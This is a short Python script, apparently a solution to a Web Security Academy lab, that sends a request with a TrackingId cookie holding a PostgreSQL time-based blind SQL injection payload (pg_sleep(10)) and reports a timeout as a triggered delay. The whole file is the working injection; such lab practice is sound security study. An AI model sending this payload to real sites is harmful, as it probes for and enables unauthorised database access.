import requests as req

url = 'https://0afd00ff03f291d98199116c008d00ad.web-security-academy.net/'

cookies = {
    "TrackingId": f"C850fsOclunmm2qj'||pg_sleep(10)--",
    "session": "hs85wC395xQLa033MDIyx0wyHSwmr5aI"
            
}
try:
    res =  req.get(url, cookies=cookies, timeout=10)
except:
    print("triggered time delays")